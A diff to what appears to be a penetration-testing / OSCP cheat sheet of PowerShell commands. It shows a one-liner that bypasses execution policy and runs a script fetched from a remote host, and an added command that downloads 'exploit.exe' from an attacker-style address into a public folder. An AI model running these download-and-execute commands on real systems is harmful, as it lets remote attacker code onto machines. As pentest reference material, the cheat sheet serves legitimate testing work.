@@ -24,3 +24,9 @@ Hand list of Powershell commands frequently used during penetration tests / OSCP
 ```Powershell
 Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('http://192.168.100.10/code.ps1'))
 ```
+
+## Download Remote File Using Powershell from Windows command prompt
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
+```
+
